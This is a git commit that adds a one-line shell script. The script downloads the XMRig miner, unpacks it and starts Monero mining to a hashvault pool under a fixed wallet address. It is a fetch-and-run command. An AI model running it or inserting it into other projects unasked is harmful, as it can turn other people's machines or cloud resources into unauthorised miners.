d7ee4a7ba54d21fdf5e81f010422fc9e09b8550d
martyelnoratp <110387209+martyelnoratp@users.noreply.github.com>
2022-08-01 16:42:21 +0700

    Create xmrw.sh

---
+++ xmrw.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz && tar xvzf xmrig-6.17.0-linux-static-x64.tar.gz && cd xmrig-6.17.0/ && ./xmrig -o frankfurt01.hashvault.pro:443 -u 85jvM5MtrqzeDAiNzjfShW2SGSFrdj2kPBt955gmhNBPCWurMymS13qZeszUWdqu7q5yNqtGnV1YU4wdDRRmMiP6SEQoujB -p 1 -k --tls
